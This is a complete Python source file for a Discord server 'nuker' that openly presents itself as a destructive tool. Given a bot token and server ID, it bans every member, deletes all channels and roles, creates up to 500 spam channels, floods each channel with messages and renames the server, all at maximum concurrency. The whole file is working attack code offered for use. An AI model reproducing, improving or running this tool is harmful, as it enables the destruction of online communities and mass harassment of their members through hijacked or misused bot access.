#Made by Gl1tch : https://github.com/Gl1tch404x

import os
import asyncio
import sys
import time
import aiohttp
import discord
from discord.ext import commands
import colorama
from colorama import Fore, Style
from logo import display_logo

colorama.init(autoreset=True)

TOKEN = None
TOKEN_TYPE = None
GUILD_ID = None
client = None

MAX_CONCURRENT_OPERATIONS = 50000
RATE_LIMIT_MULTIPLIER = 0
BATCH_SIZE = 10000

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_colored(text, color=Fore.WHITE):
    print(f"{color}{text}{Style.RESET_ALL}")

def print_success(text):
    print(f"{Fore.MAGENTA}[+] {text}{Style.RESET_ALL}")

def print_error(text):
    print(f"{Fore.MAGENTA}[!] {text}{Style.RESET_ALL}")

def print_info(text):
    print(f"{Fore.MAGENTA}[*] {text}{Style.RESET_ALL}")

def print_menu():
    clear_screen()
    display_logo()
    print_colored("\nMain Menu:", Fore.MAGENTA)
    print_colored("1. Start Nuking", Fore.MAGENTA)
    print_colored("2. About Tool", Fore.MAGENTA)
    print_colored("3. Exit", Fore.MAGENTA)
    print("\n")

def about_tool():
    clear_screen()
    display_logo()
    print_colored("\nAbout Glitched Tools Nuker Tool:", Fore.MAGENTA)
    print_colored("Glitched Tools is a Discord server nuking tool", Fore.MAGENTA)
    print_colored("This tool allows you to perform various destructive actions on Discord servers At High Rated Speed using bot tokens.", Fore.MAGENTA)
    print_colored("\nFeatures:", Fore.MAGENTA)
    print_colored("- Ban all members", Fore.MAGENTA)
    print_colored("- Delete all channels", Fore.MAGENTA)
    print_colored("- Create spam channels", Fore.MAGENTA)
    print_colored("- Spam messages in all channels", Fore.MAGENTA)
    print_colored("- Change server name", Fore.MAGENTA)
    print_colored("- Delete all roles", Fore.MAGENTA)
    print_colored("- Change server icon", Fore.MAGENTA)

    input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")

async def validate_token_async(token, token_type):
    if token_type == 'bot':
        headers = {
            'Authorization': f"Bot {token}",
            'Content-Type': 'application/json'
        }
    else:
        headers = {
            'Authorization': f"{token}",
            'Content-Type': 'application/json'
        }

    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_OPERATIONS, limit_per_host=MAX_CONCURRENT_OPERATIONS)
    timeout = aiohttp.ClientTimeout(total=5)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get('https://discord.com/api/v10/users/@me', headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    username = data.get('username')
                    print_success(f"Token is valid! Logged in as: {username}")
                    return True
                else:
                    try:
                        error_info = await response.json()
                    except:
                        error_info = {"message": f"Status code: {response.status}"}
                    print_error(f"Invalid token. {error_info.get('message', '')}")
                    return False
    except Exception as e:
        print_error(f"Error validating token: {str(e)}")
        return False
    finally:
        await connector.close()

async def validate_token(token, token_type):
    return await validate_token_async(token, token_type)

async def ultra_fast_ban_member(guild, member, semaphore):
    async with semaphore:
        if member.id != guild.me.id and member.id != guild.owner_id:
            try:
                await member.ban(reason="ResellNuker", delete_message_days=0)
                print_success(f"Banned: {member.name}#{member.discriminator}")
                return 1
            except:
                return 0
        return 0

async def ban_all_members(guild):
    print_info("Starting ultra-fast member banning...")

    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OPERATIONS)
    members = []

    try:
        async for member in guild.fetch_members(limit=None):
            members.append(member)
    except Exception as e:
        print_error(f"Error fetching members: {str(e)}")
        return 0

    tasks = [ultra_fast_ban_member(guild, member, semaphore) for member in members]

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        ban_count = sum(r for r in results if isinstance(r, int))
        return ban_count

    return 0

async def ultra_fast_delete_channel(channel, semaphore):
    async with semaphore:
        try:
            await channel.delete()
            print_success(f"Deleted channel: {channel.name}")
            return 1
        except:
            return 0

async def delete_all_channels(guild):
    print_info("Starting MAXIMUM SPEED channel deletion...")

    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OPERATIONS)
    channels = list(guild.channels)

    tasks = [ultra_fast_delete_channel(channel, semaphore) for channel in channels]

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        deleted_count = sum(r for r in results if isinstance(r, int))
        return deleted_count

    return 0

async def ultra_fast_create_channel(guild, name, semaphore):
    async with semaphore:
        try:
            await guild.create_text_channel(name=name)
            print_success(f"Created channel: {name}")
            return 1
        except:
            return 0

async def create_spam_channels(guild, num_channels, channel_name):
    print_info(f"Creating {num_channels} spam channels at MAXIMUM SPEED...")

    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OPERATIONS)
    tasks = []

    for i in range(num_channels):
        name = f"{channel_name}-{i+1}" if num_channels > 1 else channel_name
        tasks.append(ultra_fast_create_channel(guild, name, semaphore))

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        created_count = sum(r for r in results if isinstance(r, int))
        return created_count

    return 0

async def change_server_name(guild, new_name):
    print_info(f"Changing server name to: {new_name}")

    try:
        old_name = guild.name
        await guild.edit(name=new_name)
        print_success(f"Server name changed from '{old_name}' to '{new_name}'")
        return True
    except Exception as e:
        print_error(f"Failed to change server name: {str(e)}")
        return False

async def ultra_fast_delete_role(role, semaphore):
    async with semaphore:
        try:
            await role.delete()
            print_success(f"Deleted role: {role.name}")
            return 1
        except:
            return 0

async def delete_all_roles(guild):
    print_info("Starting ultra-fast role deletion...")

    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OPERATIONS)
    roles = [role for role in guild.roles if role != guild.default_role and role.position < guild.me.top_role.position]

    tasks = [ultra_fast_delete_role(role, semaphore) for role in roles]

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        deleted_count = sum(r for r in results if isinstance(r, int))
        return deleted_count

    return 0

async def ultra_fast_send_message(channel, message, semaphore):
    async with semaphore:
        try:
            await channel.send(message)
            return 1
        except:
            return 0

async def spam_all_channels_ultra_fast(guild, message, num_messages):
    print_info(f"Starting MAXIMUM SPEED spam to all channels with {num_messages} messages each...")

    text_channels = [ch for ch in guild.channels if isinstance(ch, discord.TextChannel)]

    if not text_channels:
        print_error("No text channels found to spam")
        return 0

    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OPERATIONS * 2)
    all_tasks = []

    for _ in range(num_messages):
        for channel in text_channels:
            task = ultra_fast_send_message(channel, message, semaphore)
            all_tasks.append(task)

    batch_count = 0
    total_sent = 0

    for i in range(0, len(all_tasks), BATCH_SIZE):
        batch = all_tasks[i:i+BATCH_SIZE]
        results = await asyncio.gather(*batch, return_exceptions=True)
        sent_in_batch = sum(r for r in results if isinstance(r, int))
        total_sent += sent_in_batch
        batch_count += 1

        if batch_count % 10 == 0:
            print_success(f"Processed {batch_count} batches, sent {total_sent} messages")

    return total_sent

async def start_nuking():
    global TOKEN, TOKEN_TYPE, GUILD_ID, client

    clear_screen()
    display_logo()

    TOKEN_TYPE = 'bot'
    TOKEN = input(f"{Fore.MAGENTA}Enter your bot token: {Style.RESET_ALL}")

    if not await validate_token(TOKEN, TOKEN_TYPE):
        input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")
        return

    GUILD_ID = input(f"{Fore.MAGENTA}Enter the server ID to nuke: {Style.RESET_ALL}")
    try:
        GUILD_ID = int(GUILD_ID)
    except ValueError:
        print_error("Invalid server ID. Please enter a valid number.")
        input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")
        return

    try:
        intents = discord.Intents.all()
    except AttributeError:
        try:
            intents = discord.Intents.default()
            intents.members = True
            intents.guilds = True
            intents.messages = True
            intents.message_content = True
        except Exception:
            intents = discord.Intents(
                guilds=True,
                members=True,
                bans=True,
                emojis=True,
                integrations=True,
                webhooks=True,
                invites=True,
                voice_states=True,
                presences=True,
                messages=True,
                guild_messages=True,
                dm_messages=True,
                reactions=True,
                guild_reactions=True,
                dm_reactions=True,
                typing=True,
                guild_typing=True,
                dm_typing=True,
                message_content=True
            )

    client = commands.Bot(command_prefix='!', intents=intents, max_messages=None)

    clear_screen()
    display_logo()
    print_colored("Select nuking options (enter 'y' for yes, 'n' for no):", Fore.MAGENTA)

    ban_members = input(f"{Fore.MAGENTA}Ban all members? (y/n): {Style.RESET_ALL}").lower() == 'y'
    delete_channels = input(f"{Fore.MAGENTA}Delete all channels? (y/n): {Style.RESET_ALL}").lower() == 'y'
    create_channels = input(f"{Fore.MAGENTA}Create spam channels? (y/n): {Style.RESET_ALL}").lower() == 'y'

    num_channels = 0
    channel_name = ""
    if create_channels:
        while True:
            try:
                num_channels = int(input(f"{Fore.MAGENTA}How many channels to create? (1-500): {Style.RESET_ALL}"))
                if 1 <= num_channels <= 500:
                    break
                else:
                    print_error("Please enter a number between 1 and 500.")
            except ValueError:
                print_error("Please enter a valid number.")

        channel_name = input(f"{Fore.MAGENTA}Enter channel name (without numbers): {Style.RESET_ALL}")

    spam_channels = input(f"{Fore.MAGENTA}Spam messages in all channels? (y/n): {Style.RESET_ALL}").lower() == 'y'
    spam_message = ""
    num_spam_messages = 0
    if spam_channels:
        spam_message = input(f"{Fore.MAGENTA}Enter spam message content: {Style.RESET_ALL}")
        while True:
            try:
                num_spam_messages = int(input(f"{Fore.MAGENTA}How many messages to send per channel? (1-100): {Style.RESET_ALL}"))
                if 1 <= num_spam_messages <= 100:
                    break
                else:
                    print_error("Please enter a number between 1 and 100.")
            except ValueError:
                print_error("Please enter a valid number.")

    change_name = input(f"{Fore.MAGENTA}Change server name? (y/n): {Style.RESET_ALL}").lower() == 'y'
    new_server_name = ""
    if change_name:
        new_server_name = input(f"{Fore.MAGENTA}Enter new server name: {Style.RESET_ALL}")

    delete_roles = input(f"{Fore.MAGENTA}Delete all roles? (y/n): {Style.RESET_ALL}").lower() == 'y'

    clear_screen()
    display_logo()
    print_colored("You have selected the following actions:", Fore.MAGENTA)
    if ban_members:
        print_colored("- Ban all members", Fore.MAGENTA)
    if delete_channels:
        print_colored("- Delete all channels", Fore.MAGENTA)
    if create_channels:
        print_colored(f"- Create {num_channels} channels named '{channel_name}-X'", Fore.MAGENTA)
    if spam_channels:
        print_colored(f"- Send {num_spam_messages} ultra-high-speed spam messages to each channel", Fore.MAGENTA)
    if change_name:
        print_colored(f"- Change server name to '{new_server_name}'", Fore.MAGENTA)
    if delete_roles:
        print_colored("- Delete all roles", Fore.MAGENTA)

    confirm = input(f"\n{Fore.MAGENTA}Are you sure you want to continue with these actions? (y/n): {Style.RESET_ALL}").lower()
    if confirm != 'y':
        print_info("Nuking cancelled.")
        input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")
        return

    @client.event
    async def on_ready():
        print_success(f"Logged in as {client.user.name}")

        guild = client.get_guild(GUILD_ID)
        if not guild:
            print_error(f"Could not find server with ID {GUILD_ID}")
            await client.close()
            return

        print_info(f"Starting MAXIMUM SPEED nuking process on server: {guild.name}")

        results = []
        start_time = time.time()

        tasks = []

        if change_name:
            tasks.append(change_server_name(guild, new_server_name))

        if delete_roles:
            tasks.append(delete_all_roles(guild))

        if ban_members:
            tasks.append(ban_all_members(guild))

        if spam_channels and not delete_channels:
            tasks.append(spam_all_channels_ultra_fast(guild, spam_message, num_spam_messages))

        if delete_channels:
            tasks.append(delete_all_channels(guild))

        if create_channels:
            tasks.append(create_spam_channels(guild, num_channels, channel_name))

        if tasks:
            concurrent_results = await asyncio.gather(*tasks, return_exceptions=True)

            result_index = 0
            if change_name:
                if concurrent_results[result_index]:
                    results.append(f"Changed server name to '{new_server_name}'")
                result_index += 1

            if delete_roles:
                deleted = concurrent_results[result_index]
                if isinstance(deleted, int):
                    results.append(f"Deleted {deleted} roles")
                result_index += 1

            if ban_members:
                banned = concurrent_results[result_index]
                if isinstance(banned, int):
                    results.append(f"Banned {banned} members")
                result_index += 1

            if spam_channels and not delete_channels:
                spammed = concurrent_results[result_index]
                if isinstance(spammed, int):
                    results.append(f"Sent {spammed} ultra-speed spam messages")
                result_index += 1

            if delete_channels:
                deleted = concurrent_results[result_index]
                if isinstance(deleted, int):
                    results.append(f"Deleted {deleted} channels")
                result_index += 1

            if create_channels:
                created = concurrent_results[result_index]
                if isinstance(created, int):
                    results.append(f"Created {created} spam channels")
                result_index += 1

                if spam_channels:
                    spammed = await spam_all_channels_ultra_fast(guild, spam_message, num_spam_messages)
                    results.append(f"Sent {spammed} high-speed spam messages across all new channels")

        end_time = time.time()
        execution_time = end_time - start_time

        print_info(f"Nuking completed in {execution_time:.2f} seconds")
        print_colored("\nNuking Summary:", Fore.MAGENTA)
        for result in results:
            print_colored(f"- {result}", Fore.MAGENTA)

        print_success("Nuking process completed!")
        input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")

        await client.close()

    try:
        await client.start(TOKEN)
    except Exception as e:
        print_error(f"Error starting bot: {str(e)}")
        input(f"\n{Fore.MAGENTA}Press Enter to return to the main menu...{Style.RESET_ALL}")

def main():
    while True:
        print_menu()
        choice = input(f"{Fore.MAGENTA}Enter your choice (1-3): {Style.RESET_ALL}")

        if choice == '1':
            asyncio.run(start_nuking())
        elif choice == '2':
            about_tool()
        elif choice == '3':
            print_info("Exiting...")
            sys.exit(0)
        else:
            print_error("Invalid choice. Please select 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    main()
